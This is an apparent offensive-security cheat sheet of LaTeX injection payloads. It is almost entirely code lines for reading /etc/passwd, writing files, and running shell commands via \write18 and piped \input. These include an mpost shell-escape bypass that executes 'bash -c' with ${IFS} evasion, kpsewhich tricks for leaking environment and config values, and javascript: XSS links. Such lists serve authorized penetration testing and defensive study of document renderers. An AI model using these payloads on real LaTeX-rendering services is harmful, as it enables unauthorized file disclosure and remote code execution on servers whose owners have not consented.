# Basics

>[!INFO] What is LaTex ?
> LaTeX is a document preparation system used for designing the structure of the document or working with the mathematical expressions and is stored as a image to be displayed or in pdf format. It can be vulnerable to arbitrary command injection or path traversal.

# Exploit

## Read files

```bash
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
\lstinputlisting{/etc/passwd}

# raw files
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

## Write file

```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

## Command execution

```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}

# if errors : encode base64
```

## Cross-Site Scripting

```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

# Resources

https://0day.work/hacking-with-latex/
